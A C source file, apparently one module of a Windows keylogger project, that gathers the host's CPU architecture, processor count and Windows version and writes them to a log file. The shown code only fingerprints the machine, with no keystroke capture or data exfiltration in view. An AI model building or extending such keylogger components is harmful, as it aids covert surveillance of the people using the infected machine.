#include "keylogger.h"

const char* get_arch_name(WORD arch)
{
	switch (arch)
	{
		case PROCESSOR_ARCHITECTURE_INTEL:			return "Intel (x86)";
		case PROCESSOR_ARCHITECTURE_MIPS:			return "MIPS";
		case PROCESSOR_ARCHITECTURE_ALPHA:			return "Alpha";
		case PROCESSOR_ARCHITECTURE_PPC:			return "PowerPC";
		case PROCESSOR_ARCHITECTURE_SHX:			return "SHX";
		case PROCESSOR_ARCHITECTURE_ARM:			return "ARM";
		case PROCESSOR_ARCHITECTURE_IA64:			return "Intel Itanium";
		case PROCESSOR_ARCHITECTURE_ALPHA64:		return "Alpha64";
		case PROCESSOR_ARCHITECTURE_MSIL:			return "MSIL";
		case PROCESSOR_ARCHITECTURE_AMD64:			return "AMD64 (x64)";
		case PROCESSOR_ARCHITECTURE_IA32_ON_WIN64:	return "IA32 on Win64";
		case PROCESSOR_ARCHITECTURE_NEUTRAL:		return "Neutral";
		case PROCESSOR_ARCHITECTURE_ARM64:			return "ARM64";
		case PROCESSOR_ARCHITECTURE_ARM32_ON_WIN64:	return "ARM32 on Win64";
		case PROCESSOR_ARCHITECTURE_IA32_ON_ARM64:	return "IA32 on ARM64";
		case PROCESSOR_ARCHITECTURE_UNKNOWN:		return "Unknown";
		default:									return "Unknown (undefined)";
	}
}

void get_cpu_info(void)
{
	SYSTEM_INFO sysInfo;
	GetSystemInfo(&sysInfo);
	char cpuInfo[256];
	snprintf(cpuInfo, sizeof(cpuInfo), "CPU Architecture: %s\nNumber of Processors: %lu\n",
				 get_arch_name(sysInfo.wProcessorArchitecture),
				(unsigned long)sysInfo.dwNumberOfProcessors);
	write_to_file(cpuInfo);
}

void get_windows_info(void)
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	if (hMod)
	{
		void* pFn = (void*)GetProcAddress(hMod, "RtlGetVersion");
		if (pFn)
		{
			RtlGetVersionPtr fn = (RtlGetVersionPtr)pFn;
			RTL_OSVERSIONINFOW rovi;
			ZeroMemory(&rovi, sizeof(rovi));
			rovi.dwOSVersionInfoSize = sizeof(rovi);
			if (fn(&rovi) == 0)
			{
				char versionInfo[256];
				snprintf(versionInfo, sizeof(versionInfo),
						 "Windows version: %ld.%ld (build %ld)\n",
						 rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
				write_to_file(versionInfo);
				return;
			}
		}
	}
	write_to_file("Impossible de récupérer la version\n");
}
